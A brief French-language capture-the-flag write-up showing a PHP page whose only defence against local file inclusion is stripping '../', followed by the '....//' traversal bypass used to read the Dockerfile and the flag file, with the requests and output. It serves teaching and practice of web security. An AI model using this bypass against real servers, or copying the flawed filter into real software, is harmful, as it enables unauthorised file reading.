On arrive sur un site qui affiche le contenu du index.php et notament la protection censé empêcher une attaque LFI :

```
 <?php

$file = isset($_GET['file']) ? str_replace('../', '', $_GET['file']) : null;
if (isset($file) && !empty($file)) {
    try {
        
        if (!file_exists("./$file")) {
            throw new Exception("File not found.");
        }
        
        $content = @file_get_contents("./$file"); 
        if ($content === false) {
            throw new Exception("Failed to read the file.");
        }
        
        echo $content;
    } catch (Exception $e) {
        
        error_log("Error: " . $e->getMessage());
        
        echo "An error occurred while trying to read the file.";
    }
} else {
    
    highlight_file('index.php');
}
print($file);
?>
```
Globalement les caractères ../ sont remplacé par rien. Mais sur linux on peu utiliser ....// qui sera intérpreté.

On peu lire le Dockerfile pour savoir ou ce trouve le flag:

```
https://web3.ctf.yogosha.com/?file=Dockerfile
FROM php:7.4-apache COPY index.php /var/www/html/index.php RUN mkdir -p /var/www/flag COPY flag.txt /var/www/flag/flag.txt RUN chmod -R 755 /var/www/flag && chown -R www-data:www-data /var/www/flag RUN chown -R www-data:www-data /var/www/html \ && chmod -R 755 /var/www/html Dockerfile
```

```
https://web3.ctf.yogosha.com/?file=....//....//....//var/www/flag/flag.txt
StarHack{LFI?oh_wow_oh_wow} ../../../var/www/flag/flag.txt
```